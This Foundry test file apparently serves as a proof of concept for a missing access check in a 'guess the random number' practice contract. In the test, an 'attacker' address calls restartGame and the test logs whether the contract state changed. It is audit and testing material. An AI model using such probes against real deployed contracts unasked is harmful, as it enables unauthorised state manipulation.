// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/guess_the_random_number.sol";

contract RestartGameAccessControlTest is Test {
    GuessTheRandomNumberChallenge game;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(attacker, 1 ether);

        vm.startPrank(owner);
        game = new GuessTheRandomNumberChallenge{value: 1 ether}();
        vm.stopPrank();
    }

    function test_NonOwnerCanRestartGame() public {
        // State snapshot before attack
        console.log("--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(game).balance;
        uint256 totalGamesBefore = game.totalGames();
        console.log("Contract balance: %s wei", contractBalanceBefore);
        console.log("Total games: %s", totalGamesBefore);

        console.log("--- Trigger Operation: attacker.restartGame ---");
        vm.startPrank(attacker);
        game.restartGame{value: 1 ether}();
        vm.stopPrank();

        // State snapshot after attack
        console.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(game).balance;
        uint256 totalGamesAfter = game.totalGames();
        console.log("Contract balance: %s wei", contractBalanceAfter);
        console.log("Total games: %s", totalGamesAfter);

        // Differential state validation
        bool contractBalanceChanged = contractBalanceAfter == contractBalanceBefore + 1 ether;
        bool gamesCounterChanged = totalGamesAfter == totalGamesBefore + 1;
        bool vulnerabilityExploited = contractBalanceChanged && gamesCounterChanged;

        // Vulnerability verdict based on state comparison
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Non-owner successfully manipulated contract state - balance increased by 1 ether, game counter incremented");
        } else {
            console.log("Vulnerability not Exist: State changes mismatch - balance changed? %s; games counter changed? %s", 
                        contractBalanceChanged, gamesCounterChanged);
        }
    }
}